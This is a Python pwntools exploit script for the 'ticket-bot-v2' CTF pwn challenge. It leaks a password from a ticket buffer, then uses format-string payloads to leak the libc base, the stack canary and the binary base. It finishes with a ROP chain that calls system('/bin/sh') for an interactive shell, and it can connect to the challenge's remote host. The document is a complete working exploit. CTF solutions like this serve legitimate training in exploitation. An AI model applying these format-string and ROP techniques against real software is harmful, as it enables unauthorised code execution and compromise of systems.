#!/usr/bin/env python3
from pwn import *
import os
import sys

context.update(
    arch='amd64',
    endian='little',
    os='linux',
    log_level='debug',
    terminal=['tmux', 'split-window', '-h', '-p 65'],
)

REMOTE = False
TARGET = os.path.realpath('/ctf-writeups/CyberSpace CTF 2024/pwn/ticket-bot-v2/chal')
TARGET_LIBC = os.path.realpath('/ctf-writeups/CyberSpace CTF 2024/pwn/ticket-bot-v2/libc.so.6')
elf = ELF(TARGET)
libc = ELF(TARGET_LIBC)

def new_ticket(r, msg):
    r.sendlineafter(b'Login\n========================\n', b'1')
    r.sendlineafter(b'here:\n', msg)

def view_ticket(r, id):
    r.sendlineafter(b'Login\n========================\n', b'2')
    r.sendlineafter(b'ticketID\n', id)

def service_login(r, password):
    r.sendlineafter(b'Login\n========================\n', b'3')
    r.sendlineafter(b'Password\n', password)

def change_admin_password(r, password):
    r.sendlineafter(b'Tickets\n========================\n', b'1')
    r.sendlineafter(b'Password\n', password)

def attach(r):
    if REMOTE:
        return

    bkps = []
    cmds = []

    gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))

def exploit(r):
    attach(r)

    r.sendlineafter(b'here:\n', b'A' * 4)

    for i in range(5):
        new_ticket(r, b'A' * 4)

    view_ticket(r, b'5')
    r.recvuntil(b'A' * 4)

    password = u32(r.recv(4))

    service_login(r, str(password).encode())
    change_admin_password(r, b'%3$p')
    r.recvuntil(b'to\n')

    libc.address = int(r.recvline().split(b'0x')[1].split(b'=')[0], 16) - (libc.sym.write + 23)

    service_login(r, str(password).encode())
    change_admin_password(r, b'%7$p')
    r.recvuntil(b'to\n')

    canary = int(r.recvline().split(b'0x')[1].split(b'=')[0], 16)

    service_login(r, str(password).encode())
    change_admin_password(r, b'%9$p')
    r.recvuntil(b'to\n')

    elf.address = int(r.recvline().split(b'0x')[1].split(b'=')[0], 16) - (elf.sym.AdminMenu + 129)

    rop = ROP(elf)

    rop.raw(str(0x01010101).encode())
    rop.raw(canary)
    rop.raw(cyclic(8))
    rop.raw(rop.ret)
    rop.call(libc.sym.system, [next(libc.search(b'/bin/sh'))])

    service_login(r, str(password).encode())
    change_admin_password(r, rop.chain())
    r.interactive()
    return

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == 'remote':
        REMOTE = True
        r = remote('ticket-bot-v2.challs.csc.tf', 1337)
    else:
        REMOTE = False
        r = process([TARGET,])

    exploit(r)
    exit(0)
